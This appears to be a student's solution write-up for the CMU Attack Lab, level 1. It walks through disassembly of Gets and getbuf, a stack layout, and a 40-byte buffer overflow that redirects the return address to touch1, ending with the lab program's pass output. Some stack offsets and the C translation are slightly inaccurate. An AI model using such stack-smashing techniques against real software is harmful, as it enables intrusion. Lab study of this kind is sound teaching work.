# Solution

## Part I: Code Injection Attacks

### Level 1

Here is the assembly code for *Gets*:

```Assembly
0000000000401a40 <Gets>:
  401a40:	41 54                	push   %r12
  401a42:	55                   	push   %rbp
  401a43:	53                   	push   %rbx
  401a44:	49 89 fc             	mov    %rdi,%r12
  401a47:	c7 05 b3 36 20 00 00 	movl   $0x0,0x2036b3(%rip)        # 605104 <gets_cnt>
  401a4e:	00 00 00 
  401a51:	48 89 fb             	mov    %rdi,%rbx
  401a54:	eb 11                	jmp    401a67 <Gets+0x27>
  401a56:	48 8d 6b 01          	lea    0x1(%rbx),%rbp
  401a5a:	88 03                	mov    %al,(%rbx)
  401a5c:	0f b6 f8             	movzbl %al,%edi
  401a5f:	e8 3c ff ff ff       	call   4019a0 <save_char>
  401a64:	48 89 eb             	mov    %rbp,%rbx
  401a67:	48 8b 3d 62 2a 20 00 	mov    0x202a62(%rip),%rdi        # 6044d0 <infile>
  401a6e:	e8 4d f3 ff ff       	call   400dc0 <_IO_getc@plt>
  401a73:	83 f8 ff             	cmp    $0xffffffff,%eax
  401a76:	74 05                	je     401a7d <Gets+0x3d>
  401a78:	83 f8 0a             	cmp    $0xa,%eax
  401a7b:	75 d9                	jne    401a56 <Gets+0x16>
  401a7d:	c6 03 00             	movb   $0x0,(%rbx)
  401a80:	b8 00 00 00 00       	mov    $0x0,%eax
  401a85:	e8 6e ff ff ff       	call   4019f8 <save_term>
  401a8a:	4c 89 e0             	mov    %r12,%rax
  401a8d:	5b                   	pop    %rbx
  401a8e:	5d                   	pop    %rbp
  401a8f:	41 5c                	pop    %r12
  401a91:	c3                   	ret
```

Here is a rough translation to C:

```C
int Gets(char* buf) {
    gets_cnt = 0; // global variable
    for (char c = getchar(); c != -1 && c != '\n'; c = getchar()) {
        *buf = c;
        save_char(c);
        buf += 1;
    }
    *buf = 0;
    save_term();
    return 0;
}
```

This function is called within *getbuf*:

```Assembly
00000000004017a8 <getbuf>:
  4017a8:	48 83 ec 28          	sub    $0x28,%rsp
  4017ac:	48 89 e7             	mov    %rsp,%rdi
  4017af:	e8 8c 02 00 00       	call   401a40 <Gets>
  4017b4:	b8 01 00 00 00       	mov    $0x1,%eax
  4017b9:	48 83 c4 28          	add    $0x28,%rsp
  4017bd:	c3                   	ret
  4017be:	90                   	nop
  4017bf:	90                   	nop
  ```

Before the call to *Gets*, it basically prepares a buffer of size 0x28 (40 bytes) on the stack and pass the stack pointer as input to *Gets*.

Here is the stack organization at the point after *call*:

| address     | data        |
|------------ | ----------- |
| %rsp + 0x38 | 0x401971    |
| %rsp + 0x30 |             |
| %rsp + 0x28 |             |
| %rsp + 0x20 |             |
| %rsp + 0x18 |             |
| %rsp + 0x10 |             |
| %rsp + 0x08 |             |
| %rsp        | 0x4017b4    |

Where *%rdi* point to *%rsp + 0x8*, *%rsp* contains the address to the instruction after the call to *Gets* in *getbuf*, and *rsp + 0x38* contains the address to the instructino after the call to *getbuf* in *test*.

Our goal is to replace *%rsp + 0x38* with the address of the *touch1* function (0x4017c0).

To do that, we can simply write 40 arbitrary characters, and then 4 bytes corresponding to the *touch1* address. See [exploit_ctarget_1.txt](exploit_ctarget_1.txt) for the solution to this problem.

Here is the output after running ctarget with the exploit string:

```bash
❯ ./ctarget -q < solution/exploit_ctarget_1_raw.txt
Cookie: 0x59b997fa
Type string:Touch1!: You called touch1()
Valid solution for level 1 with target ctarget
PASS: Would have posted the following:
        user id bovik
        course  15213-f15
        lab     attacklab
        result  1:PASS:0xffffffff:ctarget:1:00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 C0 17 40 00 00 00 00 
```

## Level 2
